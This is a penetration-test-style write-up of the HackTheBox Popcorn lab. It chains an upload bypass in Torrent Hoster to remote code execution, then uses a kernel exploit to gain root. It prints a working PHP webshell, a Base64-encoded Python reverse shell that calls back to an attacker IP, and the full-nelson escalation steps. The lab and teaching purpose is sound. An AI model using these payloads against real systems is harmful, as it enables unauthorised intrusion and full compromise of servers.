# HTB Popcorn - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-8

**Target:** 10.129.14.108

**Environment:** HTB Popcorn (Retired Machine)

---

## 0. Lesson Learned

Look deeper. When you couldn't manipulate the torrent file, the answer lied in editing the png screenshot of the torrent.

---

## 1. Executive Summary

The objective of this engagement was to perform a controlled penetration test against the **HTB Popcorn** host. The goal was to identify exploitable vulnerabilities, achieve user and root compromise, and document all findings with reproducible steps.

The assessment was successful. A chain of web application vulnerabilities in the *Torrent Hoster* software allowed authenticated file upload manipulation, leading to remote code execution (RCE). Privilege escalation was achieved via a vulnerable 2.6.31 Linux kernel using the **full-nelson** exploit. Full system compromise was obtained.

---

## 2. Scope

- **Target:** 10.129.14.108
- **Environment:** HackTheBox (legal/authorized)
- **Testing Window:** 2025-12-4 to 2025-12-8
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Vulnerability Analysis
- Exploitation
- Privilege Escalation
- Post-Exploitation

---

## 4. Information Gathering

An initial port scan revealed two open services: SSH and Apache 2.2.12.

### Nmap Scan

```
nmap -p- -sCV 10.129.14.108 -T4 -oA popcorn_initial
```

*Result:*

- 22/tcp - ssh - OpenSSH 5.1p1
- 80/tcp - http - Apache httpd 2.2.12

Apache default page showed no useful content. Virtual host **popcorn.htb** added to `/etc/hosts/`.

---

## 5. Web Enumeration

### Gobuster Scan

```
gobuster dir -u http://popcorn.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

*Result:*

Gobuster enumeration revealed the following relevant directories:

- `/test/` -> PHP info page exposing **PHP 5.2.10** and **MySQL 5.1.37**
- `/torrent/` -> Torrent Hoster web application
- `/rename/` -> File move functionality

These versions and applications indicated potential upload vulnerabilities.

---

## 6. Exploitation

### Torrent Hoster - Upload Function Abuse

The *Torrent Hoster* application allowed user registration and torrent uploads, including screenshot upload functionality.

Attempts to upload a `.php` file directly were rejected as "not a valid torrent file."

However, editing the torrent upload and manipulating the **screenshot upload request** via Burp allowed embedding a PHP webshell inside a PNG upload. This bypassed file validation.

**Injected Webshell Payload:**

```
<?php system($_GET['cmd']); ?>
```

The uploaded file was located via directory enumeration in `/torrent/upload/`.

Executing:

```
http://popcorn.htb/torrent/upload/<uploadedfile>.php?cmd=ls
```

Verified code execution.

### Reverse Shell

A Base64-encoded Python reverse shell was delivered through the webshell:

```
http://popcorn.htb/torrent/upload/<uploadedfile>.php?cmd=echo ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNC4yNyI7ZXhwb3J0IFJQT1JUPTQ0MztweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn | base64 -d | bash
```

A stable TTY was obtained using:

```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo && fg
export TERM=xterm-256color
```

*Result:* **www-data** shell.

---

## 7. Privilege Escalation

No privilege escalation vector through sudo, SUID binaries, or cron jobs. LinPEAS failed due to environmental issues.

Further manual enumeration revealed Linux Kernel version **2.6.31**, susceptible to local privilege escalation exploits:

```
uname -a
```

Using Linux Exploit Suggester, **full-nelson.c** was identified as viable. Compiled on target:

```
gcc full-nelson.c
./a.out
```

*Result:* **root shell obtained**.

---

## 8. Post-Exploitation

**User Flag**: *REDACTED*

```
cat /home/george/user.txt
```

**Root Flag**: *REDACTED*

```
cat /root/root.txt
```

---

## 9. Key Vulnerabilities Identified

| Vulnerability | Severity | Description | Impact |
|---------------|----------|-------------|--------|
| Torrent Hoster Screenshot Upload RCE | Critical | Insufficient file validation allowed arbitrary PHP code execution. | Remote Code Execution |
| Linux Kernel 2.6.31 (full-nelson) | High | Kernel race condition enabling privilege escalation. | Root Access |

---

## 10. Recommendations

- Upgrade or decommission the vulnerable *Torrent Hoster* application.
- Enforce strict file-type validation and MIME checking.
- Disable execution in upload directories via web server configuration.
- Patch kernel to a supported, secure version.
- Apply least-privilege hardening across services.

---

## 11. Conclusion

The **HTB Popcorn** host was fully compromised through a combination of web application vulnerabilities and a kernel-level privilege escalation. All exploitation steps were reproducible and validated.

---

## 12. Appendix

Resources Used:

[Base64-Encoded Python Reverse Shell Generator](https://www.revshells.com/)

[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

[Full Nelson Exploit](https://vulnfactory.org/exploits/full-nelson.c)